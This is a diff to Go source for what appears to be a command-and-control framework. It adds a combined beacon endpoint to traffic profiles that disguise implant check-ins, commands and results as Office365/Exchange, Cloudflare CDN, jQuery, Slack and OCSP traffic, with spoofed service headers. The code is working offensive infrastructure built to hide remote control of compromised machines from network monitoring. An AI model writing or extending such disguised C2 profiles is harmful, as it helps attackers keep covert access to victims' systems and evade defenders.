@@ -13,9 +13,12 @@ type C2Profile struct {
 	// URI paths — relative to server root, no trailing slash.
 	// CommandPath MUST contain the literal "{agent_id}" which the agent
 	// substitutes with its UUID and the server registers as a gin ":id" param.
+	// BeaconPath is the combined checkin+result+command endpoint (B1).
+	// It replaces separate Checkin + GetNextCommand calls with a single POST per cycle.
 	CheckinPath string
 	CommandPath string // contains {agent_id}
 	ResultPath  string
+	BeaconPath  string // contains {agent_id} — combined beacon endpoint
 
 	// ContentType for POST bodies (default "application/json").
 	ContentType string
@@ -36,6 +39,16 @@ func (p *C2Profile) CommandPathForAgent(agentID string) string {
 // e.g. "/ews/exchange.asmx/{agent_id}" → "/ews/exchange.asmx/:id"
 func (p *C2Profile) CommandGinPattern() string {
 	return strings.ReplaceAll(p.CommandPath, "{agent_id}", ":id")
+}
+
+// BeaconPathForAgent substitutes {agent_id} in BeaconPath with the agent UUID.
+func (p *C2Profile) BeaconPathForAgent(agentID string) string {
+	return strings.ReplaceAll(p.BeaconPath, "{agent_id}", agentID)
+}
+
+// BeaconGinPattern returns the gin route pattern for BeaconPath.
+func (p *C2Profile) BeaconGinPattern() string {
+	return strings.ReplaceAll(p.BeaconPath, "{agent_id}", ":id")
 }
 
 // ── Built-in profiles ─────────────────────────────────────────────────────────
@@ -72,6 +85,7 @@ func Default() *C2Profile {
 		CheckinPath: "/api/v1/checkin",
 		CommandPath: "/api/v1/command/{agent_id}/next",
 		ResultPath:  "/api/v1/command/result",
+		BeaconPath:  "/api/v1/beacon/{agent_id}",
 		ContentType: "application/json",
 		Headers:     map[string]string{},
 		UserAgents: []string{
@@ -87,6 +101,7 @@ func Office365() *C2Profile {
 		CheckinPath: "/autodiscover/autodiscover.xml",
 		CommandPath: "/ews/exchange.asmx/{agent_id}",
 		ResultPath:  "/mapi/emsmdb",
+		BeaconPath:  "/ews/calendar.asmx/{agent_id}",
 		ContentType: "application/json",
 		Headers: map[string]string{
 			"X-MS-Exchange-Organization-AuthSource":       "corp.local",
@@ -113,6 +128,7 @@ func CDN() *C2Profile {
 		CheckinPath: "/cdn-cgi/rum",
 		CommandPath: "/cdn-cgi/challenge-platform/h/b/flow/{agent_id}",
 		ResultPath:  "/cdn-cgi/zaraz/t",
+		BeaconPath:  "/cdn-cgi/challenge-platform/h/g/orchestrate/{agent_id}",
 		ContentType: "application/json",
 		Headers: map[string]string{
 			"CF-IPCountry":     "US",
@@ -137,6 +153,7 @@ func jQuery() *C2Profile {
 		CheckinPath: "/assets/js/jquery-3.7.1.min.js",
 		CommandPath: "/assets/js/bundle.{agent_id}.min.js",
 		ResultPath:  "/assets/js/vendors~main.chunk.js",
+		BeaconPath:  "/assets/js/runtime~main.{agent_id}.js",
 		ContentType: "application/x-www-form-urlencoded",
 		Headers: map[string]string{
 			"Referer":         "https://code.jquery.com/",
@@ -158,6 +175,7 @@ func Slack() *C2Profile {
 		CheckinPath: "/api/users.identity",
 		CommandPath: "/api/conversations.history/{agent_id}",
 		ResultPath:  "/api/chat.postMessage",
+		BeaconPath:  "/api/rtm.connect/{agent_id}",
 		ContentType: "application/json; charset=utf-8",
 		Headers: map[string]string{
 			"Authorization":              "Bearer xoxb-placeholder-token",
@@ -180,6 +198,7 @@ func OCSP() *C2Profile {
 		CheckinPath: "/ocsp",
 		CommandPath: "/ocsp/{agent_id}",
 		ResultPath:  "/crl/root.crl",
+		BeaconPath:  "/crl/{agent_id}.crl",
 		ContentType: "application/ocsp-request",
 		Headers: map[string]string{
 			"Cache-Control": "no-cache",
